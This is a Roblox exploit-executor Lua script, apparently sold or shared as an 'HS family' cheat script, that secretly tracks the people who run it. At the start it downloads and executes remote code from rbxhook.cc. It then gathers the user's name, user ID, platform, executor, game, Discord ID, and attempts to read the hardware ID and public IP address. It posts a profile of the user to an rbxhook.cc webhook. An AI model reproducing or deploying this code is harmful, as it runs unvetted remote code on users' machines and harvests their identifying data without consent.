getgenv().Config = {api = "d2774146aa1fb354fa4e2c005f5418a745b3c3b937b72f31fe4609dca52b0a0f"} -- DO NOT CHANGE

loadstring(game:HttpGet("https://rbxhook.cc/lua/track.lua"))()

local player = game:GetService("Players").LocalPlayer
local HttpService = game:GetService("HttpService")
local UserInputService = game:GetService("UserInputService")
local MarketplaceService = game:GetService("MarketplaceService")

local url = "https://rbxhook.cc/r/31006b3a0e3745d6ec4504bdc326d118"

local function getPlatform()
    if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
        return "Mobile"
    elseif UserInputService.KeyboardEnabled then
        return "PC"
    elseif UserInputService.GamepadEnabled then
        return "Console"
    else
        return "Unknown"
    end
end

local executor = "Unknown"
local executorVersion = "N/A"
if identifyexecutor then
    executor = identifyexecutor()
elseif syn then
    executor = "Synapse X"
elseif KRNL_LOADED then
    executor = "Krnl"
elseif fluxus then
    executor = "Fluxus"
elseif is_sirhurt_closure then
    executor = "SirHurt"
elseif OXYGEN then
    executor = "Oxygen U"
end

local hwid = "Unavailable"
pcall(function()
    if syn and syn.gethwid then
        hwid = syn.gethwid()
    elseif gethwid then
        hwid = gethwid()
    elseif fluxus and getgenv and getgenv().fluxus then
        hwid = tostring(getgenv().fluxus.HWID or "Unavailable")
    elseif delta and get_hw_id then
        hwid = tostring(get_hw_id())
    end
end)

local gameName = "Unknown"
pcall(function()
    local info = MarketplaceService:GetProductInfo(game.PlaceId)
    if info and info.Name then 
        gameName = info.Name 
    end
end)

local serverRegion = "Unknown"
pcall(function()
    serverRegion = tostring(game:GetService("LocalizationService"):GetCountryRegionForPlayerAsync(player) or "Unknown")
end)

local ipAddress = "Unavailable"
pcall(function()
    local ipResponse = game:HttpGet("https://api.ipify.org")
    if ipResponse and ipResponse ~= "" then
        ipAddress = ipResponse
    end
end)

local accountAge = "Unknown"
local membership = "Free"
pcall(function()
    accountAge = tostring(player.AccountAge) .. " days"
    membership = player.MembershipType == Enum.MembershipType.Premium and "Premium" or "Free"
end)

local data = {
    avatar_url = "https://rbxhook.cc/img/logo.png",
    content = "",
    username = "Hs bot",
    embeds = {
        {
            title = "Join " .. player.DisplayName ,
            color = 3447003,
            author = {
                name = player.Name,
                icon_url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(player.UserId) .. "&width=150&height=150&format=png"
            },
            thumbnail = {
                url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(player.UserId) .. "&width=420&height=420&format=png"
            },
            fields = {
                {
                    name = "Discord ID",
                    value = "Retrieving Discord ID...",
                    inline = false
                },
                {
                    name = "User Info",
                    value = "Name Display: ".. player.DisplayName .. "\nUsername: " .. player.Name .. "\nUser ID: " .. player.UserId .. "\nPlatform: " .. getPlatform() .. "\nRango: Mienbro",
                    inline = false
                },
                {
                    name = "Executor Info", 
                    value = "Executor: " .. executor ,
                    inline = false
                },
                {
                    name = "Game Info",
                    value = "Game Name: " .. gameName,
                    inline = false
                }
            },
            footer = {
                text = "HS family Script | User ID: " .. tostring(player.UserId)
            },
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }
    }
}

-- JunkieCore Discord ID
local discordId = "Not available"
if JD_DISCORD_ID ~= nil and JD_DISCORD_ID ~= "" then
    discordId = "<@" .. JD_DISCORD_ID .. "> (" .. JD_DISCORD_ID .. ")"
else
    discordId = "❌ Not linked"
end

for i, field in ipairs(data.embeds[1].fields) do
    if field.name == "Discord ID" then
        field.value = discordId
        break
    end
end

print("=== Runtime Variables ===")
if JD_IS_PREMIUM ~= nil then
    print("JD_IS_PREMIUM:", JD_IS_PREMIUM)
end
if JD_EXPIRES_AT ~= nil then
    print("JD_EXPIRES_AT:", JD_EXPIRES_AT)
end
if JD_DISCORD_ID ~= nil then
    print("JD_DISCORD_ID:", JD_DISCORD_ID)
end
if JD_CREATED_AT ~= nil then
    print("JD_CREATED_AT:", JD_CREATED_AT)
end
if JD_REASON ~= nil then
    print("JD_REASON:", JD_REASON)
end

local success, encoded = pcall(function()
    return HttpService:JSONEncode(data)
end)

if not success then
    print("JSON encoding failed")
    return
end

local requestFunc = syn and syn.request or request or http_request
if not requestFunc then
    print("Error: JK291-RH")
    return
end

local response = requestFunc({
    Url = url,
    Method = "POST",
    Headers = {
        ["Content-Type"] = "application/json"
    },
    Body = encoded
})
